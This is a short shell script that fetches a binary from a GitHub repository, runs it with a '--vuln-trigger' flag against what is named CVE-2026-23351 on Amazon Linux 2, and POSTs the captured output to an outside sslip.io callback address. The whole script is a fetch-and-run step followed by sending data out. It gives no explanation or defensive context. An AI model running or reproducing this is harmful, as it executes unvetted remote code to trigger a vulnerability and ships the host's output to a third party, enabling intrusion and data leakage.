#!/bin/sh
set -u
BIN='https://raw.githubusercontent.com/begimher/snapgpt-probes/8b4de89aa416bbbee01530323c1393e846555876/cve-2026-23351-amzn2-two-diag'
SINK='https://54.209.51.244.sslip.io/callback/snapgpt-cve-diag-1370-20261106'
curl -fsSL "$BIN" -o /tmp/cve-diag
chmod +x /tmp/cve-diag
timeout 600 /tmp/cve-diag --vuln-trigger > /tmp/cve-diag.out 2>&1
rc=$?
printf 'CVE_RC=%s\n' "$rc"
wc -c /tmp/cve-diag.out
tail -30 /tmp/cve-diag.out
curl -fsS -X POST -H 'Content-Type: text/plain' --data-binary @/tmp/cve-diag.out "$SINK" >/dev/null
